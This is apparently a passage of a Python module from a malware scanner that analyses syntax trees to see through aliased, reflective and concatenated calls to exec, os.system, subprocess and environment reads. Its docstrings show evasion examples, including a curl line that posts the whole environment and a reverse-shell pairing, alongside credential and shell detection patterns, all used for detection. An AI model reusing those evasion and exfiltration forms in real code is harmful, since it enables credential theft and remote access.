"""Resolving Python obfuscation that a byte pattern cannot see.

Capability rules match literal syntax: `os.system`, `base64.b64decode`,
`subprocess.run`. Bind the name differently and nothing labels, so no composite
can form and the file reports clean:

    from os import environ as ENV
    from subprocess import run as go
    go(["curl", "-d", str(dict(ENV)), url])          # identical logic, silent

    __builtins__["ex" + "ec"](payload)               # `exec` is never a token
    f = os.system; f(command)                        # nor is `os.system`

Every one of those targets is derivable **without running anything**. `ast.parse`
builds a tree and executes nothing -- the same reason `ecosystems/pypi.py`
already reads `setup.py` this way -- so the alias, the binding and the folded
string are all available to a static pass. That is what this module does.

**The guarantee it exists to keep.** Static analysis cannot decide runtime
behaviour, so the spec is not "catch everything". It is:

> No evasion is silent. Every technique used to hide behaviour is either
> resolved to the real behaviour, or lights up a signal of its own.

`resolve` handles everything constant-derivable. What it cannot name --
`getattr(os, decode(blob))()`, a target read from the network -- becomes
`Capability.DYNAMIC_DISPATCH` instead, so going dynamic to escape the name match
costs the attacker a different label rather than buying silence. The residue
after both is behaviour that exists only at runtime, which no static tool
observes and which the tool should not claim to.

**It adds to the regex path, never replaces it.** The patterns stay as the fast
prefilter and as the answer for files this cannot parse -- and a file that fails
to parse says so, because silently analysing less is the failure this project
is organised against.
"""

from __future__ import annotations

import ast
import re
from dataclasses import dataclass
from typing import TYPE_CHECKING

from cordon_scanner.core.models import Capability

if TYPE_CHECKING:
    from collections.abc import Iterator

# Dotted primitives, mapped to what they mean. The keys are what a resolved
# call must look like once aliases and bindings are unwound, so `go(...)` where
# `go` is `subprocess.run` arrives here as `subprocess.run`.
PRIMITIVES: dict[str, Capability] = {
    "base64.b64decode": Capability.DECODE,
    "base64.b32decode": Capability.DECODE,
    "base64.b16decode": Capability.DECODE,
    "base64.urlsafe_b64decode": Capability.DECODE,
    "base64.decodebytes": Capability.DECODE,
    "binascii.a2b_base64": Capability.DECODE,
    "binascii.unhexlify": Capability.DECODE,
    "codecs.decode": Capability.DECODE,
    "zlib.decompress": Capability.DECOMPRESS,
    "bytes.fromhex": Capability.DECODE,
    # `marshal.loads` is deliberately absent. The pattern tier labels it `execute`
    # -- a marshal stream holds code objects, so loading one is an evaluation wearing
    # a serialisation format, and `CAP.PY.EXECUTE.001` argues it at length -- and
    # labelling it `decode` here as well handed `SUSPECT.DECODE_EXEC.001` both halves
    # out of one call. CPython's own `Lib/importlib/_bootstrap_external.py` was
    # reported for it: `_compile_bytecode`'s body is `code = marshal.loads(data)`, the
    # function every `.pyc` in the world is loaded by.
    #
    # Nothing is lost by dropping the second label. The two-call forms still report,
    # because their decode comes from the other call:
    # `marshal.loads(base64.b64decode(DATA))` is base64 decoding and marshal
    # executing, and `exec(marshal.loads(base64.b64decode(blob)))` is the same with a
    # third step. Only a lone `marshal.loads(data)` goes quiet, which is the importer.
    "pickle.loads": Capability.DESERIALIZE,
    "exec": Capability.EXECUTE,
    "eval": Capability.EXECUTE,
    "compile": Capability.EXECUTE,
    "os.system": Capability.SPAWN,
    "os.popen": Capability.SPAWN,
    "os.execv": Capability.SPAWN,
    "os.execve": Capability.SPAWN,
    "os.spawnv": Capability.SPAWN,
    "subprocess.run": Capability.SPAWN,
    "subprocess.call": Capability.SPAWN,
    "subprocess.check_call": Capability.SPAWN,
    "subprocess.check_output": Capability.SPAWN,
    "subprocess.Popen": Capability.SPAWN,
    "pty.spawn": Capability.SPAWN,
    "os.environ": Capability.CREDENTIAL,
    "os.getenv": Capability.CREDENTIAL,
    "os.environb": Capability.CREDENTIAL,
    "urllib.request.urlopen": Capability.EGRESS,
    "urllib.request.urlretrieve": Capability.EGRESS,
    "requests.get": Capability.EGRESS,
    "requests.post": Capability.EGRESS,
    "requests.put": Capability.EGRESS,
    "requests.patch": Capability.EGRESS,
    "requests.delete": Capability.EGRESS,
    "requests.request": Capability.EGRESS,
    "httpx.get": Capability.EGRESS,
    "httpx.post": Capability.EGRESS,
    "httpx.Client": Capability.EGRESS,
    "socket.socket": Capability.EGRESS,
    "socket.create_connection": Capability.EGRESS,
    "socket.gethostbyname": Capability.EGRESS,
    "socket.getaddrinfo": Capability.EGRESS,
    "smtplib.SMTP": Capability.EGRESS,
    "ftplib.FTP": Capability.EGRESS,
    "http.client.HTTPConnection": Capability.EGRESS,
    "http.client.HTTPSConnection": Capability.EGRESS,
}

ENVIRONMENT = frozenset({"os.environ", "os.getenv", "os.environb"})
"""The environment primitives, which need a second question asked of them."""

CREDENTIAL_VARIABLE = re.compile(
    r"""(?ix)
    (?:^|[_.\-])
    (?:
        token | secret | password | passwd | passphrase | credential | credentials
      | api[_\-]?key | apikey | access[_\-]?key | private[_\-]?key | signing[_\-]?key
      | client[_\-]?secret | refresh[_\-]?token | bearer | auth | session | cookie
      | pat | sas | dsn
    )
    (?:$|[_.\-])
    """,
)
"""Environment variable names that hold credential material.

The pattern tier already draws this line and carries `os.environ.get('PORT')`
and `os.environ.get('DEBUG')` as negative tests: "reading a named setting is not
the same as serialising the whole environment, and a rule that cannot tell them
apart fires on every configuration module in existence."

This tier did not draw it, and being the AST tier it could draw it exactly -- it
has the key in hand. So every `os.getenv("HOME")`, `os.environ.get("DEBUG")` and
`os.environ["PATH"]` in existence was labelled credential access, and fed
`SUSPECT.EXFIL.001`: 675 findings across 234 of the 1,487 repositories measured,
a great many of them a module that reads its own configuration, calls an API and
starts a subprocess.

Whole-environment access stays credential access whatever the code does with it,
which is the other half of the pattern tier's rule and the half that matters:
`dict(os.environ)` is the shape that ships the lot."""

REFLECTIVE = frozenset({"getattr", "__import__", "globals", "vars", "locals"})
"""Names whose whole purpose is to reach something by a computed name.

Resolved when the name is constant, and reported as dynamic dispatch when it is
not."""

DANGEROUS_NAMESPACES = frozenset({"os", "subprocess", "sys", "builtins", "__builtins__", "shutil"})
"""Namespaces where reflective access with a computed name has no benign
analogue worth the silence. `getattr(self, method_name)` on a plugin object is
ordinary; `getattr(os, something_decoded)` is not."""


@dataclass(frozen=True, slots=True)
class AstHit:
    """One capability resolved from the tree, with where it was seen."""

    capability: Capability
    line: int
    detail: str
    column: int = 0
    """Byte offset of the call within its line, 0-based. Carried for the same
    reason as `AstCall.column`: a composite's byte-distance bound needs the true
    position, not the start of the line, or a minified one-line file collapses
    every hit to the same place."""
    command: str | None = None
    """The command string handed to a spawn primitive, when it is derivable.

    A shell command written as a Python string is data to every language pack:
    the Python rules see a string, and the shell rules never run on a `.py`
    file. Carrying it here is what lets the shell rules be applied to the one
    place in the file where a string is unambiguously a command."""

    fixed_command: bool = False
    """Whether EVERY part of that command was a literal in the source.

    `command` is filled in when any part resolves, because a partially resolved
    command is still worth matching shell rules against. This is the stricter
    question, and a different one: a spawn whose whole argv is written out cannot
    be running anything the file decoded or downloaded, because what it runs is
    visible in the file.

    False for a command mentioning a temporary or relative path, which is where a
    dropped payload lands: `subprocess.run(["/tmp/update"])` is a constant argv and
    is also the second half of a dropper."""


@dataclass(frozen=True, slots=True)
class Assembled:
    """A string value built by concatenation, and what it evaluates to.

    Carried separately from capabilities because it answers a different
    question: not what this code can do, but what value it contains that no
    contiguous pattern can see.
    """

    value: str
    line: int
    name: str | None
    """The name it was assigned to, when it was assigned to one."""

    assembled: bool = True
    """Whether the value was built from more than one piece.

    A plain literal is carried too, because Python joins adjacent literals with
    no operator and the byte scan cannot see the joined value. But the two are
    not equivalent evidence: the entropy heuristic's whole justification is that
    building a value out of pieces is not how a URL or an identifier is written,
    and applying it to every constant in a file reports every long URL as a
    credential. Provider shapes and known prefixes apply to both."""


@dataclass(frozen=True, slots=True)
class AstCall:
    """One call site, with its callee resolved and its arguments folded.

    The difference between this and the source text is the whole point of the
    `ast` match kind. `f = os.system; f(cmd)` produces `name="os.system"`, and
    so does `getattr(os, "sys" + "tem")(cmd)` -- neither of which any pattern
    over the bytes can see, because in the first the call site says `f` and in
    the second the primitive's name does not appear in the file at all.
    """

    name: str
    """The callee's dotted name, resolved through imports, aliases, local
    bindings and `getattr`. `""` when it could not be resolved."""

    line: int

    column: int = 0
    """Byte offset of the call within its line, 0-based.

    Carried so a composite's proximity check can measure the true distance
    between two call sites rather than treating both as the start of their line.
    On a minified bundle the whole file is one line, and without this every call
    collapses to the same position -- which is how a decode and an execution
    four thousand bytes apart came to satisfy a rule that asks for them in the
    same breath."""

    arguments: tuple[str, ...] = ()
    """Positional arguments folded to their constant values, in order.

    `""` for an argument that is not a derivable constant, so position is
    preserved -- a query about argument 1 must not silently read argument 2
    because argument 0 was a variable. A list or tuple argument folds to its
    elements joined by a space, which is how `["sh", "-c", "..."]` and
    `"sh -c ..."` become the same string to a rule author."""

    keywords: tuple[tuple[str, str], ...] = ()
    """Keyword arguments, folded the same way. Present so a rule can say
    `shell=True` without caring where in the call it was written."""

    has_constructed_argument: bool = False
    """Whether any argument is a BUILT expression rather than a literal or name.

    A concatenation, an f-string, a `.format()`, a slice, or a nested call.
    This is what separates `resolve("api.example.com")` -- a name written in
    the source -- from `resolve(blob[i:i+60] + ".exfil.invalid")`, where the
    hostname carries program data. The regex tier draws the same line by
    requiring a `+`, `%` or f-string after the resolver call; carrying it here
    lets an `ast` rule stay that precise while seeing through an aliased
    import, which the regex cannot."""

    @property
    def argument_text(self) -> str:
        """Every resolved argument as one string, for a pattern to run over."""
        parts = [a for a in self.arguments if a]
        parts.extend(f"{k}={v}" for k, v in self.keywords if v)
        return " ".join(parts)


class PythonAnalyzer:
    """Resolves capability primitives through aliases, bindings and constants."""

    def __init__(self) -> None:
        # Alias -> dotted primitive. `import base64 as b` gives `b -> base64`;
        # `from os import system as s` gives `s -> os.system`.
        self._aliases: dict[str, str] = {}
        # Local name -> dotted primitive, from `f = os.system`.
        self._bindings: dict[str, str] = {}
        # Inner call -> the call that invokes its result. `getattr(os, "system")`
        # resolves to a primitive, but the command it is handed belongs to the
        # enclosing `(...)`, so the two nodes have to be related to read it.
        self._invoked: dict[int, ast.Call] = {}
        # Names whose every possible value is written in the file. See `_enumerated`.
        self._enumerated: set[str] = set()
        self._hits: list[AstHit] = []

    @classmethod
    def analyse(cls, source: str) -> list[AstHit]:
        """Capabilities resolvable from this source, or none if it will not parse."""
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = cls()
        analyzer._collect_names(tree)
        analyzer._walk(tree)
        return analyzer._hits

    @classmethod
    def calls(cls, source: str) -> list[AstCall]:
        """Every call in this source, with callee and arguments resolved.

        The same resolution `analyse` applies to the fixed `PRIMITIVES` table,
        exposed for rules to query instead. That table is this module's own
        list of what matters; a rule pack needs to name its own.

        Unparseable source yields nothing, which the caller must treat as "not
        examined" rather than "nothing here" -- the regex tier still runs over
        the same file, which is why this is an addition to it and never a
        replacement.
        """
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = cls()
        analyzer._collect_names(tree)
        # `_invoked` maps an inner call to the call that invokes its result, so
        # `getattr(os, "system")("...")` can find the argument list that belongs
        # to the outer parentheses.
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Call | ast.Subscript):
                analyzer._invoked[id(node.func)] = node

        found: list[AstCall] = []
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            resolved = analyzer._resolve_callee(node)
            if resolved is None:
                continue
            name, callsite = resolved
            found.append(
                AstCall(
                    name=name,
                    line=getattr(node, "lineno", 0),
                    column=getattr(node, "col_offset", 0),
                    arguments=tuple(analyzer._argument_value(a) for a in callsite.args),
                    keywords=tuple(
                        (kw.arg, analyzer._argument_value(kw.value))
                        for kw in callsite.keywords
                        if kw.arg
                    ),
                    has_constructed_argument=any(cls._is_constructed(a) for a in callsite.args),
                )
            )
        return found

    @staticmethod
    def _is_constructed(node: ast.AST) -> bool:
        """Whether an argument is BUILT rather than named or written whole.

        A concatenation, an interpolation, a `.format()`, a slice or a nested
        call -- the shapes that carry runtime data into an argument. A plain
        literal, a bare name and an attribute access are not constructed: those
        are how ordinary code passes a fixed host or a variable.
        """
        # A folds-to-a-constant expression is a literal written in pieces, not a
        # value built at runtime: `"api." + ".example.com"` is the fixed string
        # `"api..example.com"`. Only an expression that pulls in a name, a call
        # or a slice carries runtime data, so a fully constant one is not
        # "constructed" for this purpose -- otherwise a resolver call with a
        # hostname spelled as two adjacent literals reads as exfiltration.
        if PythonAnalyzer.constant(node) is not None:
            return False
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add | ast.Mod):
            return True
        if isinstance(node, ast.JoinedStr | ast.Subscript):
            return True
        if isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Attribute) and func.attr in {"format", "join"}:
                return True
            # A nested call whose value becomes the argument -- `tohex(host())`.
            return True
        return False

    def _resolve_callee(self, node: ast.Call) -> tuple[str, ast.Call] | None:
        """This call's dotted name, and the call whose arguments belong to it.

        The two differ for reflective dispatch: in `getattr(os, "system")(cmd)`
        the name comes from the inner call and `cmd` from the outer one.
        """
        dotted = self._dotted(node.func)
        base = dotted.split(".")[-1] if dotted else None

        if base in REFLECTIVE:
            namespace = self._dotted(node.args[0]) if node.args else None
            attribute = self.constant(node.args[1]) if len(node.args) > 1 else None
            if namespace and attribute is not None:
                return f"{namespace}.{attribute}", self._invoked.get(id(node), node)
            return None

        return (dotted, node) if dotted else None

    def _argument_value(self, node: ast.AST) -> str:
        """One argument folded to a string, or `""` if it is not derivable.

        A sequence folds to its elements joined by a space so that
        `subprocess.run(["sh", "-c", payload])` and `os.system("sh -c ...")`
        read the same to a rule, which is the point: they are the same act
        written two ways, and a rule author should not have to write it twice.
        """
        if isinstance(node, ast.List | ast.Tuple):
            parts = [self.constant(element) or "" for element in node.elts]
            return " ".join(p for p in parts if p)
        # `constant` answers "what string is this", and deliberately returns
        # None for a bool or a number -- it exists to fold names and commands.
        # A rule asking about `shell=True` is asking about a literal that is
        # not a string, so it is rendered here rather than widening `constant`
        # for every other caller.
        if isinstance(node, ast.Constant) and isinstance(node.value, bool | int | float):
            return str(node.value)
        return self.constant(node) or ""

    @classmethod
    def assembled(cls, source: str) -> list[Assembled]:
        """String values built by concatenation, folded to what they evaluate to.

        A credential regex needs a contiguous literal, and `"ghp_" + "..."` is
        not one. The value is identical to the interpreter and invisible to the
        pattern, which makes splitting a token across a `+` the cheapest way to
        commit a live credential past a secret scanner.

        Returns every derivable string value, including plain literals. That
        looks redundant against the byte-level pattern pass and is not: adjacent
        string literals in Python concatenate with no operator, so `("ghp_"
        "rest")` is a single constant to the parser and two separate quoted runs
        in the file. Deduplication happens in the caller, which hashes the value
        rather than its spelling.
        """
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []

        found: list[Assembled] = []

        for node in ast.walk(tree):
            targets: list[str] = []
            if isinstance(node, ast.Assign):
                value: ast.AST | None = node.value
                targets = [t.id for t in node.targets if isinstance(t, ast.Name)]
            elif isinstance(node, ast.AnnAssign | ast.AugAssign):
                value = node.value
                targets = [node.target.id] if isinstance(node.target, ast.Name) else []
            else:
                continue

            if value is None:
                continue

            # Plain constants are included, and that is not redundant with the
            # byte scan. Python concatenates adjacent literals with no operator
            # at all -- `("ghp_" "rest")` is one `Constant` to the parser and
            # two separated literals in the source -- so the contiguous pattern
            # never sees the joined value while the interpreter only ever sees
            # the joined value. Anything the byte scan did find is already in
            # the caller's `seen` set and is dropped there.
            folded = cls.constant(value)
            if folded is None:
                continue

            found.append(
                Assembled(
                    value=folded,
                    line=getattr(value, "lineno", 1),
                    name=targets[0] if targets else None,
                    assembled=not isinstance(value, ast.Constant),
                )
            )

        return found

    @staticmethod
    def parses(source: str) -> bool:
        """Whether this is Python the analyzer could read.

        Asked separately so the caller can report a file it could not analyse
        rather than quietly treating an unreadable file as an uninteresting
        one."""
        try:
            ast.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return False
        return True

    # -- Name resolution -------------------------------------------------

    def _collect_names(self, tree: ast.AST) -> None:
        """Build the alias and binding maps before evaluating any call.

        Two passes because a module may bind a name after using it inside a
        function body, and the function runs later. Order in the file is not
        order of execution, and matching on the first would miss the ordinary
        case of a helper defined above its imports.
        """
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    self._aliases[alias.asname or alias.name] = alias.name
            elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
                for alias in node.names:
                    self._aliases[alias.asname or alias.name] = f"{node.module}.{alias.name}"
            elif isinstance(node, ast.Assign) and len(node.targets) == 1:
                target = node.targets[0]
                if isinstance(target, ast.Name):
                    dotted = self._dotted(node.value)
                    if dotted:
                        self._bindings[target.id] = dotted
            elif (
                isinstance(node, ast.For)
                and isinstance(node.target, ast.Name)
                and self._is_literal_strings(node.iter)
            ):
                # A loop over a literal list of strings. Every value the variable can
                # take is written out above it, so a call through it is not a name this
                # file withholds -- which is the whole of what the dynamic-dispatch
                # label claims.
                #
                # `odysseus` ends its `setup.py` with a dependency check:
                # `for mod in ["fastapi", "uvicorn", ...]: try: __import__(mod)`, and it
                # was reported at CRITICAL as install-time code reaching a function by a
                # computed name. Six names, all of them legible.
                self._enumerated.add(node.target.id)

    @classmethod
    def _is_literal_strings(cls, node: ast.AST) -> bool:
        """Whether this expression is a list, tuple or set of string literals.

        Not a general evaluator: only the written-out form, where reading the file is
        reading the values. A name bound to a list elsewhere is not followed, because
        the next thing to follow would be a list that is appended to, and then one
        built from a network response.
        """
        if not isinstance(node, ast.List | ast.Tuple | ast.Set):
            return False
        return bool(node.elts) and all(
            isinstance(element, ast.Constant) and isinstance(element.value, str)
            for element in node.elts
        )

    def _dotted(self, node: ast.AST) -> str | None:
        """The dotted name an expression refers to, unwinding aliases.

        `b.b64decode` where `b` is `base64` becomes `base64.b64decode`; `go`
        where `go` is `subprocess.run` becomes `subprocess.run`.
        """
        if isinstance(node, ast.Name):
            return self._aliases.get(node.id) or self._bindings.get(node.id) or node.id
        if isinstance(node, ast.Attribute):
            base = self._dotted(node.value)
            return f"{base}.{node.attr}" if base else None
        return None

    # -- Constant folding ------------------------------------------------

    @classmethod
    def constant(cls, node: ast.AST) -> str | None:
        """The string an expression evaluates to, if it is derivable statically.

        Handles the shapes that hide a name: adjacent literals, `+` chains,
        `"".join([...])` and f-strings whose parts are all constant. Anything
        else returns None, which is the signal that the target is genuinely
        computed at runtime.
        """
        if isinstance(node, ast.Constant):
            return node.value if isinstance(node.value, str) else None
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left, right = cls.constant(node.left), cls.constant(node.right)
            return None if left is None or right is None else left + right
        if isinstance(node, ast.JoinedStr):
            parts = [cls.constant(value) for value in node.values]
            return None if any(part is None for part in parts) else "".join(p or "" for p in parts)
        if isinstance(node, ast.FormattedValue):
            return cls.constant(node.value)
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "join"
            and len(node.args) == 1
        ):
            separator = cls.constant(node.func.value)
            elements = node.args[0]
            if separator is not None and isinstance(elements, ast.List | ast.Tuple):
                parts = [cls.constant(element) for element in elements.elts]
                if all(part is not None for part in parts):
                    return separator.join(part or "" for part in parts)
        return None

    WRITABLE_TARGET = re.compile(
        r"""(?:^|[\s"'=])(?:\./|\.\\|/tmp/|/var/tmp/|/dev/shm/|%TEMP%|\$TMPDIR|\$HOME/\.)""",
    )
    """Paths a dropper writes its payload to.

    A constant argv naming one of these is not the reassurance the rest of
    `fixed_command` is: the command is fixed and the FILE it runs is not, because
    whatever ran before it created that file."""

    BARE_SHELL = re.compile(
        r"""(?ix)
        ^[ \t]*
        (?:[\w.-]{0,40}[/\\]){0,4}
        (?:sh|bash|zsh|ksh|dash|ash|csh|tcsh|fish|cmd|powershell|pwsh)
        (?:\.exe)?
        (?:[ \t]{1,4}-{1,2}[il]{1,2}\b){0,3}
        [ \t]*$
        """,
    )
    """A constant argv that is a shell and nothing else.

    The discount `fixed_command` applies rests on one claim: a spawn whose whole
    command is visible cannot be running something decoded or downloaded. That
    holds for `["git", "rev-parse", "HEAD"]` and fails completely for
    `["/bin/sh", "-i"]`, where the literal IS the act -- what such a shell runs
    arrives over whatever its file descriptors were wired to, which is the whole
    construction of a reverse shell.

    Measured: `subprocess.call(["/bin/sh", "-i"])` next to
    `socket.connect(("<literal ip>", 4444))` produced no finding at all, because
    the spawn half was discounted here and `MALWARE.REVERSE_SHELL.001` needs
    both. The pattern tier's hit on the same line was dropped with it, by line.

    `sh -c "<command>"` is deliberately NOT this shape: it carries its command,
    the embedded-shell tier extracts it, and the discount stays correct there."""

    @classmethod
    def _fixed_command(cls, node: ast.Call) -> bool:
        """Whether every argument of this spawn was written out in the source."""
        if not node.args:
            return False
        first = node.args[0]
        if isinstance(first, ast.List | ast.Tuple):
            parts = [cls.constant(element) for element in first.elts]
            if not parts or any(part is None for part in parts):
                return False
            resolved = " ".join(part for part in parts if part is not None)
        else:
            single = cls.constant(first)
            if single is None:
                return False
            resolved = single
        if cls.BARE_SHELL.match(resolved):
            return False
        return cls.WRITABLE_TARGET.search(resolved) is None

    @classmethod
    def _command(cls, node: ast.Call) -> str | None:
        """The command a spawn primitive is being handed.

        Both call shapes are accepted. `os.system("...")` carries the command
        as one string; `subprocess.run(["sh", "-c", "..."])` splits it across a
        sequence, and the parts are rejoined because it is the whole line that
        has to be matched against, not any single argument of it.
        """
        if not node.args:
            return None
        first = node.args[0]
        if isinstance(first, ast.List | ast.Tuple):
            parts = [cls.constant(element) for element in first.elts]
            if all(part is None for part in parts):
                return None
            return " ".join(part for part in parts if part is not None)
        return cls.constant(first)

    # -- The walk --------------------------------------------------------

    def _walk(self, tree: ast.AST) -> None:
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Call | ast.Subscript):
                # A subscript as well as a call. `globals()["exec"]()` invokes what the
                # subscript returned, and the map existed only for `getattr(...)()`.
                self._invoked[id(node.func)] = node

        keyed = self._keyed_environment_reads(tree)

        called = {id(node.func) for node in ast.walk(tree) if isinstance(node, ast.Call)}
        """The function of every call, which `_call` has already judged.

        `os.getenv` is both a primitive and an `Attribute`, so a single
        `os.getenv("GH_TOKEN")` was recorded twice: once by `_call` and again by
        the branch below, which exists for `os.environ` -- a primitive that is
        never called. vLLM's `setup.py` line 1112 reads
        `os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))` and produced four
        identical credential hits at one span. Reading a function without calling
        it is not the act the primitive describes."""

        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                self._call(node)
            elif isinstance(node, ast.Attribute | ast.Name):
                # `os.environ` is a primitive without being called.
                dotted = self._dotted(node)
                if id(node) in called:
                    continue
                if dotted in PRIMITIVES and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                    if id(node) in keyed and not CREDENTIAL_VARIABLE.search(keyed[id(node)]):
                        # `os.environ["PORT"]`. The whole mapping was never
                        # reached for; one named setting was. See
                        # `CREDENTIAL_VARIABLE`.
                        continue
                    self._record(PRIMITIVES[dotted], node, dotted)
            elif isinstance(node, ast.Subscript):
                self._subscript(node)

    def _keyed_environment_reads(self, tree: ast.AST) -> dict[int, str]:
        """Environment nodes that are read with one literal key, and that key.

        The judgement has to be made at the PARENT: `os.environ` and
        `os.environ["PATH"]` contain the same `Attribute` node, so the bare-name
        branch of the walk cannot tell a whole-environment read from a single
        setting without looking up. A node absent from this map was either used
        as a whole mapping -- passed somewhere, copied, iterated, unpacked -- or
        subscripted with something computed, and both of those are the broad
        access.
        """
        keyed: dict[int, str] = {}
        written: set[int] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if (
                        isinstance(target, ast.Subscript)
                        and self._dotted(target.value) in ENVIRONMENT
                    ):
                        # `os.environ["X"] = "1"` SETS a variable. Reading the
                        # environment is what this primitive is about, and a Google
                        # Workspace setup script in `NousResearch/hermes-agent` was
                        # reported for exfiltration on the strength of
                        # `os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"`.
                        written.add(id(target.value))

        for node in ast.walk(tree):
            if isinstance(node, ast.Subscript):
                # `os.environ["NAME"]`
                key = self.constant(node.slice)
                if key is not None and self._dotted(node.value) in ENVIRONMENT:
                    keyed[id(node.value)] = key
            elif isinstance(node, ast.Call):
                key = self.constant(node.args[0]) if node.args else None
                if key is None:
                    continue
                if self._dotted(node.func) in ENVIRONMENT:
                    # `os.getenv("NAME")`. Mapped against the function node,
                    # because the walk reaches that as a bare `Attribute` too and
                    # would record it whatever `_call` decided.
                    keyed[id(node.func)] = key
                elif (
                    isinstance(node.func, ast.Attribute)
                    and node.func.attr in {"get", "setdefault", "pop"}
                    and self._dotted(node.func.value) in ENVIRONMENT
                ):
                    # `os.environ.get("NAME")`, and the two methods that read the
                    # same way.
                    keyed[id(node.func.value)] = key
            elif isinstance(node, ast.Compare):
                # `"NAME" in os.environ` asks whether one setting is present and
                # obtains no value at all, so it is a weaker act than any of the
                # keyed reads above. It reached none of them: a `Compare` names no
                # key, registered nothing, and so the bare-`Attribute` branch of
                # the walk saw an unkeyed `os.environ` and called it
                # whole-environment access -- the broadest reading available, for
                # the narrowest act there is.
                #
                # `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ`
                # three times in its `setup.py` and `if "SALT_VERSION" in
                # os.environ` in `salt/version.py`. Both files are install-time by
                # definition and both reach the network, so both were
                # `MALWARE.EXFIL.001` at CRITICAL -- "reads credentials and
                # transmits them" -- for build flags that gate a version string.
                #
                # Judged by the name, like every other keyed read, rather than by
                # a second rule of its own. A presence test on a name that reads
                # as a credential is still worth the label, because code that asks
                # whether a token is set is code that means to use it, and the
                # read itself is its own hit wherever it happens.
                left: ast.expr = node.left
                for op, comparator in zip(node.ops, node.comparators, strict=True):
                    if isinstance(op, ast.In | ast.NotIn) and (
                        self._dotted(comparator) in ENVIRONMENT
                    ):
                        key = self.constant(left)
                        if key is not None:
                            keyed[id(comparator)] = key
                    left = comparator
        for node_id in written:
            # A written name is not a read at all, whatever the name says.
            keyed[node_id] = ""
        return keyed

    def _call(self, node: ast.Call) -> None:
        dotted = self._dotted(node.func)
        if dotted and dotted in PRIMITIVES:
            if dotted in ENVIRONMENT and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                # `os.getenv("NAME")`, whose key is its first argument. With no
                # literal key the name is computed, and a computed lookup into the
                # environment is the broad access rather than a named setting.
                key = self.constant(node.args[0]) if node.args else None
                if key is not None and not CREDENTIAL_VARIABLE.search(key):
                    return
            self._record(
                PRIMITIVES[dotted],
                node,
                dotted,
                command=self._command(node),
                fixed=self._fixed_command(node),
            )
            return

        base = dotted.split(".")[-1] if dotted else None
        if base not in REFLECTIVE:
            return

        # `getattr(os, "system")` and friends. The first argument names the
        # namespace, the second the attribute.
        namespace = self._dotted(node.args[0]) if node.args else None
        attribute = self.constant(node.args[1]) if len(node.args) > 1 else None

        if base == "__import__":
            imported = self.constant(node.args[0]) if node.args else None
            first = node.args[0] if node.args else None
            if isinstance(first, ast.Name) and first.id in self._enumerated:
                # Enumerated rather than computed. See `_collect_names`.
                return
            if imported is None and node.args:
                self._dynamic(node, "__import__ with a computed module name")
            return

        if attribute is not None and namespace:
            resolved = f"{namespace}.{attribute}"
            if resolved in PRIMITIVES:
                callsite = self._invoked.get(id(node), node)
                self._record(
                    PRIMITIVES[resolved],
                    node,
                    resolved,
                    command=self._command(callsite),
                    fixed=self._fixed_command(callsite),
                )
                return
        if len(node.args) > 1 and attribute is None and namespace in DANGEROUS_NAMESPACES:
            if len(node.args) > 2 and id(node) not in self._invoked:
                # A DEFAULT, and nothing called. `getattr(x, name, None)` asks whether an
                # attribute exists and is prepared for it not to: the third argument is
                # the caller saying so. `unslothai/unsloth` writes
                # `if getattr(sys, f"__{name}__", None) is None:` to detect its runtime.
                #
                # Both halves are needed. `getattr(os, decode(blob), None)()` has a
                # default and IS dispatch, which is what the invocation test is for.
                return
            self._dynamic(node, f"{base} on {namespace} with a computed name")

    def _subscript(self, node: ast.Subscript) -> None:
        """`__builtins__["ex" + "ec"]` and `globals()["exec"]`."""
        container = self._dotted(node.value)
        if isinstance(node.value, ast.Call):
            inner = self._dotted(node.value.func)
            container = inner.split(".")[-1] if inner else None
        key = self.constant(node.slice)

        if key is not None:
            if key in PRIMITIVES:
                self._record(PRIMITIVES[key], node, key)
            elif container and f"{container}.{key}" in PRIMITIVES:
                self._record(PRIMITIVES[f"{container}.{key}"], node, f"{container}.{key}")
            return

        if isinstance(node.ctx, ast.Store | ast.Del):
            # `globals()[name] = value` WRITES a name; it does not reach one. Re-exporting
            # from a C extension is how PyTorch populates `torch._dynamo`:
            #
            #     globals()[name] = getattr(torch._C._dynamo.eval_frame, name)
            #
            # Thirteen of PyTorch's twenty-five findings were that line and its siblings,
            # and `globals()[metric] += getattr(delta, metric)` is the same idiom
            # accumulating counters. The rule is about reaching a function by a computed
            # name, which is the READ half -- and the `getattr` on the right of these
            # assignments is exactly that, so the file still carries the capability when
            # the name it reads is genuinely computed.
            return

        if container in DANGEROUS_NAMESPACES or container in {"globals", "vars", "locals"}:
            if container in {"globals", "vars", "locals"} and id(node) not in self._invoked:
                # A READ of a module-level name, with nothing called.
                # `NousResearch/hermes-agent` caches a rendered banner as
                # `cached = globals()[cache_name]`, which reaches a VALUE by a computed
                # name -- and this rule is about reaching a FUNCTION by one.
                #
                # Only for the namespace dictionaries. `__builtins__[name]` stays a
                # finding whether it is called here or passed somewhere that will call
                # it, because nothing in `__builtins__` is a value worth fetching by a
                # computed name.
                return
            self._dynamic(node, f"{container}[...] with a computed key")

    # -- Recording -------------------------------------------------------

    def _record(
        self,
        capability: Capability,
        node: ast.AST,
        detail: str,
        command: str | None = None,
        *,
        fixed: bool = False,
    ) -> None:
        keep = command if capability is Capability.SPAWN else None
        self._hits.append(
            AstHit(
